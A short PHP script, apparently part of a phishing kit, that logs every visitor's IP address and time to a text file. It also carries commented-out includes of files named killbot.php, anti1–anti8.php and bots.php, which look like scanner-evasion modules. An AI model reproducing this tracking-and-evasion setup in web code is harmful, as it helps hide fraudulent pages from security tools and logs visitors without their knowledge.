<?php

$bxsc = $_SERVER['REMOTE_ADDR'];
;

$bsxze = fopen("visits.txt", "a+");
fwrite($bsxze, "ip : {$bxsc} | " . date('d/m/Y h:i:sa') . "\n\n");
fclose($bsxze);

// @include_once "killbot.php";
// @include_once "thewall.php";
// @include_once "anti1.php";
// @include_once "anti2.php";
// @include_once "anti3.php";
// @include_once "anti4.php";
// @include_once "anti5.php";
// @include_once "anti6.php";
// @include_once "anti7.php";
// @include_once "anti8.php";
// @include_once "xanbbx.php";
// @include_once "bots.php";
